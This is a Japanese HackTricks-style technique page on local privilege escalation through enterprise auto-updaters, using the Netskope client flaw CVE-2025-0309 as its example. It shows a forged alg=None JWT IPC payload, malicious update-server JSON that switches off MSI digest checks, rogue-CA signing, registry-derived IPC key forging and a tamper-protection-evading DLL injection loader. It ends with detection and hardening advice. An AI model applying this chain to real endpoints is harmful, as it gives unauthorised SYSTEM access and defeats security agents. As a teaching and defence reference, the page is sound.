# エンタープライズのAuto-Updatersと特権IPCの悪用（例：Netskope stAgentSvc）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低障壁のIPCインターフェースと特権の更新フローを公開するエンタープライズのエンドポイントエージェントやアップデーターに見られる、Windowsのローカル権限昇格チェーンのクラスを一般化します。代表的な例は Netskope Client for Windows < R129 (CVE-2025-0309) で、低権限ユーザーが攻撃者管理下のサーバーへの登録を強制し、その後 SYSTEM サービスがインストールする悪意あるMSIを配信できます。

再利用可能な主要な考え方:
- 特権サービスのlocalhost IPCを悪用して、攻撃者サーバーへの再登録や再構成を強制する。
- ベンダーの更新エンドポイントを実装し、不正なTrusted Root CAを配布して、updaterを悪意ある「署名済み」パッケージに向ける。
- 弱い署名者チェック（CN allow‑lists）、オプションのダイジェストフラグ、緩いMSIプロパティを回避する。
- IPCが「暗号化」されている場合、レジストリに保存された世界読み取り可能なマシン識別子からキー/IVを導出する。
- サービスがイメージパス／プロセス名で呼び出し元を制限している場合、allow‑listedなプロセスに注入するか、サスペンドで起動して最小限のスレッドコンテキストパッチでDLLをブートストラップする。

---
## 1) localhost IPC を介した攻撃者サーバーへの登録強制

多くのエージェントは、ユーザーモードのUIプロセスを提供しており、JSONを使ってlocalhostのTCP経由でSYSTEMサービスと通信します。

Netskopeでの観測:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

エクスプロイトの流れ:
1) バックエンドホスト（例：AddonUrl）を制御するクレームを持つJWTの登録トークンを作成します。署名が不要になるようにalg=Noneを使用します。
2) JWTとテナント名を使ってプロビジョニングコマンドを呼び出すIPCメッセージを送信します:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが登録/設定のためにあなたの悪意あるサーバーにアクセスし始める。例：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 呼び出し元の検証が path/name‑based の場合、リクエストは許可リストに載った vendor binary から発信すること（§4参照）。

---
## 2) アップデートチャネルをハイジャックして SYSTEM としてコードを実行する

クライアントがあなたのサーバーと通信したら、期待されるエンドポイントを実装し、攻撃者の MSI に誘導する。典型的なシーケンス：

1) /v2/config/org/clientconfig → 非常に短い更新間隔の JSON 設定を返す。例：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. サービスはそれをローカル マシンの Trusted Root ストアにインストールします。  
3) /v2/checkupdate → 悪意のある MSI と偽のバージョンを指すメタデータを提供します。

Bypassing common checks seen in the wild:
- Signer CN allow‑list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と等しいかだけをチェックするかもしれません。あなたの rogue CA はその CN を持つ leaf を発行して MSI に署名できます。
- CERT_DIGEST property: CERT_DIGEST という名前の無害な MSI プロパティを含める。インストール時に強制されないことが多いです。
- Optional digest enforcement: config フラグ (例: check_msi_digest=false) が追加の暗号検証を無効にします。

結果: SYSTEM サービスは C:\ProgramData\Netskope\stAgent\data\*.msi からあなたの MSI をインストールし、NT AUTHORITY\SYSTEM として任意のコードを実行します。

---
## 3) Forging encrypted IPC requests (when present)

R127 以降、Netskope は IPC JSON を encryptData フィールド（Base64 に見える）でラップしていました。リバースで、任意のユーザーが読み取れるレジストリ値から派生した key/IV を使う AES であることが判明しました:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現して標準ユーザーから有効な暗号化コマンドを送信できます。一般的なヒント: エージェントが突然 IPC を「暗号化」し始めたら、HKLM にある device ID、product GUID、install ID などを探してください。

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

一部のサービスは TCP 接続の PID を解決し、イメージのパス/名前を Program Files 以下の allow‑list にあるベンダーのバイナリ（例: stagentui.exe, bwansvc.exe, epdlp.exe）と比較してピアを認証しようとします。

現実的なバイパス手法は二つ:
- allow‑listed プロセス（例: nsdiag.exe）への DLL injection を行い、その内部から IPC をプロキシする。
- allow‑listed バイナリを suspended で起動し、CreateRemoteThread を使わずにプロキシ DLL をブートストラップしてドライバーが強制する改ざん防止ルールを満たす（§5 を参照）。

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

製品はしばしば minifilter/OB callbacks ドライバー（例: Stadrv）を同梱し、保護されたプロセスのハンドルから危険な権限を削ります:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

これらの制約を尊重する信頼できるユーザーモードローダー:
1) ベンダーのバイナリを CREATE_SUSPENDED で CreateProcess する。
2) 取得可能なハンドルを取る: プロセスに対して PROCESS_VM_WRITE | PROCESS_VM_OPERATION、スレッドに対しては THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知の RIP にコードをパッチするなら THREAD_RESUME のみでも可）。
3) ntdll!NtContinue（またはその他の早期に確実にマップされるスラスト）を上書きし、あなたの DLL パスで LoadLibraryW を呼び、その後戻る小さなスタブに置き換える。
4) ResumeThread してプロセス内でスタブを発動させ、DLL をロードさせる。

既に保護されたプロセスに対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（あなたがプロセスを作成した）ため、ドライバーのポリシーは満たされます。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、悪意のある MSI 署名、自動で必要なエンドポイントを提供する（/v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate）。
- UpSkope は任意（オプションで AES‑encrypted）IPC メッセージを作成するカスタム IPC クライアントで、suspended‑process 注入を含み、allow‑listed バイナリから発信させる機能を持ちます。

---
## 7) Detection opportunities (blue team)
- Local Machine Trusted Root への追加を監視する。Sysmon + registry‑mod eventing（SpecterOps のガイダンス参照）が有効です。
- エージェントのサービスから C:\ProgramData\<vendor>\<agent>\data\*.msi のようなパスで開始される MSI 実行をフラグする。
- エージェントのログをレビューして予期しない enrollment hosts/tenants を探す。例: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – addonUrl / tenant の異常や provisioning msg 148 を確認する。
- 期待される署名済みバイナリでない、または異常な子プロセスツリーから発生する localhost IPC クライアントをアラートする。

---
## Hardening tips for vendors
- enrollment/update ホストを厳格な allow‑list に束縛し、clientcode で信頼されていないドメインを拒否する。
- 画像パス/名前チェックの代わりに OS プリミティブ（ALPC security、named‑pipe SIDs）で IPC ピアを認証する。
- 秘密情報を world‑readable な HKLM に置かない。IPC を暗号化する必要があるなら、保護されたシークレットから鍵を導出するか、認証済みチャネルでネゴシエートすること。
- updater をサプライチェーンの攻撃面として扱う: 信頼する CA への完全なチェーンを要求し、パッケージ署名をピン留めした鍵で検証し、設定で検証が無効になっている場合は fail closed する。

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
